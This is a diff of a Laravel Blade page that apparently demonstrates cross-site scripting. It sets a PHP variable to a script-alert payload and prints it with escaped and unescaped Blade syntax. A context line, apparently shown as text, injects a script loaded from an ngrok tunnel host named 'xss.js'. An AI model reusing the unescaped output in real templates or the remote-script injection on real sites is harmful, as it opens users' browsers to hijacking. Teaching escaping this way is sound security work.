@@ -1,5 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
+<?php
+$name = '<script>alert("Boom!")</script>';
+?>
 
 <head>
     <meta charset="utf-8">
@@ -47,9 +50,15 @@
 var script = document.createElement('script');
 script.src = 'https://3e36-51-52-158-78.ngrok-free.app/scripts/xss.js';
 document.head.appendChild(script);
-//
 </pre>
+        {{ Js::from(['hello' => 'world']) }}
     </details>
+    <script>
+        var variable = {{ Js::from($variable) }};
+    </script>
+    <p>Hello {{ $name }}!</p>
+    <p>Hello {!! $name !!}!</p>
+    <p>Hello {!! e($name) !!}!</p>
     <form method="POST">
         @csrf
         <p>Add some markdown</p>
